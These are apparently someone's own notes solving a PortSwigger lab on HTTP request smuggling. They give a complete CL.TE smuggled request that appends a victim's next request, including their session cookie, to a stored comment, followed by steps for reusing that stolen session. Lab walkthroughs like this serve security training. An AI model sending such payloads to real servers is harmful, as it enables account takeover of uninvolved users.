# [Exploiting HTTP request smuggling to capture other users' requests](https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests)

## goal

- get the victim cookie session key and insert it in the browser session
- leave a post comment in the backend queue for the user to get that response

## exploit

- check `POST` request for a comment

```
POST /post/comment HTTP/1.1
Host: xxx.web-security-academy.net
Cookie: session=IwqFnB7j360i8RHBQB4kSwSzBJgAvLGA
Content-Length: 117
Content-Type: application/x-www-form-urlencoded
...

csrf=yyy&postId=6&comment=zxc&name=duck&email=duck%40quack&website=http%3A%2F%2Fduck.com
```

- this part should be the smuggled one

> the exploit request

- add the `&comment=zxc` and the end of the body of the `POST`

```
POST / HTTP/1.1
Host: xxx.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 275
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 950
Cookie: session=zzz

csrf=yyy&postId=6&name=duck&email=duck%40quack&website=http%3A%2F%2Fduck.com&comment=zxc
```

- send the request and wait 20-30 sec then refresh the page
- the goal is the victim get the smuggled request response
- the `Content-Length: 950` might be too long, change it if needed
- should find a post with the victim request and session key
- put that session key in the browser
